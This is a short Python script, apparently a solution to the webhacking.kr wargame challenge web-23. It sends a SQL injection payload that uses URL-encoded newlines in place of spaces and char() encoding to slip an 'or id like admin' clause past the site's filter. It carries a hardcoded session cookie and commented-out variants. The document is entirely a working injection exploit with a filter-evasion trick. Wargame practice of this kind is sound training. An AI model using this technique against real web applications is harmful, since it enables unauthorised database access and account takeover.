import requests

url='http://webhacking.kr/challenge/web/web-23/index.php?lv='

#param={'lv':'2%0aor%0a1'}#id%0alike%0a'}
#files={'upfile': ('tmp-1427959188',open('tmp-1427959188','rb'))}
cookies={'PHPSESSID':'op8vkt8cl93corgrj5krjo7g93'}
lv='2%0aor%0aid%0alike%0achar(97,100,109,105,110)'
url=url+lv
response=requests.get(url,cookies=cookies)#,params=param)
#response=requests.post(url,cookies=cookies)

print response.text
